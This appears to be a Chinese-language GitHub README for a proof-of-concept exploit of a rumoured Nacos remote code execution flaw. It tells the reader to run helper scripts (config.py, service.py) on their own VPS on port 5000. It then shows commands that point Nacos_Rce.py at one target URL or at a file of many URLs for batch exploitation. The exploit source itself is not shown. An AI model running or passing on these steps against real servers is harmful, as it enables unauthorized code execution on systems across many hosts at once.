# Nacos_Rce
网传nacos_rce漏洞poc



![image](https://github.com/user-attachments/assets/cf7e3ac3-bd47-462c-accc-4fc21b8a731f)



</br>

# 使用方法
---

### 1. 将config.py和service.py放在自己的vps上并运行

```python service.py```

![image](https://github.com/user-attachments/assets/e7e8b68c-7147-4ca3-a5bf-07b89620575f)

![image](https://github.com/user-attachments/assets/a3feb618-8255-4b4a-9b0a-ae575e7bceb9)


### 2. 单url验证
```python .\Nacos_Rce.py -t vps的ip地址 -p 5000 -u http://xxx.xxx.xxx```
![image](https://github.com/user-attachments/assets/17683bc9-5851-4222-9df7-6b71a8ddd591)
![image](https://github.com/user-attachments/assets/66c7cba3-489a-4bf4-876d-f2e375a82b44)



### 3. 多url验证
```python .\Nacos_Rce.py -t vps的ip地址 -p 5000 -f ./url.txt```
![image](https://github.com/user-attachments/assets/7eecdf9e-7c74-4115-afbc-5af9362f4db9)






